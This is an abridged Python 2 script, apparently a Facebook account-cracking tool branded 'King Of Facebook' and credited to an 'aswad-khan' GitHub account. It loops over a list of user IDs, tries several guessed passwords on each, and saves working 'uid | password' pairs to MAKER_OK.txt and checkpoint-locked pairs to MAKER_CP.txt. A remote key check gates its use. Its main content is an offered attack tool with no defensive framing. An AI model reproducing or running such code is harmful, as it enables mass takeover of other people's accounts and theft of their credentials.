...
\033[1;90m➣ Github : \033[1;97mhttps://github.com/aswad-khan
\033[1;90m➣ Fb Page: \033[1;97mASWAD KHAN Official
\033[1;94m==============================================="""
...
def reg():
    ...
    r = requests.get('https://raw.githubusercontent.com/aswad-khan/MAKER/main/server.txt').text
    if to in r:
...
def a_s():
    ...
    time.sleep(0.5)
    print 47 * '-'
    print '\t\033[1;92mKing Of Facebook\033[1;94m'
    print 47 * '-'
    ...
    def main(arg):
        ...
        try:
            ...
            q = json.loads(data)
            if 'loc' in q:
                print '\033[1;95m[MAKER-OK]➤ ' + uid + ' | ' + pass1
                ok = open('/sdcard/ids/MAKER_OK.txt', 'a')
                ok.write(uid + ' | ' + pass1 + '\n')
                ok.close()
                oks.append(uid + pass1)
            elif 'www.facebook.com' in q['error']:
                print '\033[1;97m[MAKER-CP]➤ ' + uid + ' | ' + pass1
                cp = open('MAKER_CP.txt', 'a')
                cp.write(uid + ' | ' + pass1 + '\n')
                cp.close()
                ...
                q = json.loads(data)
                if 'loc' in q:
                    print '\033[1;95m[MAKER-OK]➤ ' + uid + ' | ' + pass2
                    ok = open('/sdcard/ids/MAKER_OK.txt', 'a')
                    ok.write(uid + ' | ' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error']:
                    print '\033[1;97m[MAKER-CP]➤ ' + uid + ' | ' + pass2
                    cp = open('MAKER_CP.txt', 'a')
                    cp.write(uid + ' | ' + pass2 + '\n')
                    cp.close()
                    ...
                    q = json.loads(data)
                    if 'loc' in q:
                        print '\033[1;95m[MAKER-OK]➤ ' + uid + ' | ' + pass3
                        ok = open('/sdcard/ids/MAKER_OK.txt', 'a')
                        ok.write(uid + ' | ' + pass3 + '\n')
                        ok.close()
                        oks.append(uid + pass3)
                    elif 'www.facebook.com' in q['error']:
                        print '\033[1;97m[MAKER-CP]➤ ' + uid + ' | ' + pass3
                        cp = open('MAKER_CP.txt', 'a')
                        cp.write(uid + ' | ' + pass3 + '\n')
                        cp.close()
                        ...
                        q = json.loads(data)
                        if 'loc' in q:
                            print '\033[1;95m[MAKER-OK]➤ ' + uid + ' | ' + pass4
                            ok = open('/sdcard/ids/MAKER_OK.txt', 'a')
                            ok.write(uid + ' | ' + pass4 + '\n')
                            ok.close()
                            oks.append(uid + pass4)
                        elif 'www.facebook.com' in q['error']:
                            print '\033[1;97m[MAKER-CP]➤ ' + uid + ' | ' + pass4
                            cp = open('MAKER_CP.txt', 'a')
                            cp.write(uid + ' | ' + pass4 + '\n')
                            cp.close()
    ...
    p.map(main, id)
    print 47 * '-'
    print ' \033[1;92mBHT HOGYA AB NIKLO'
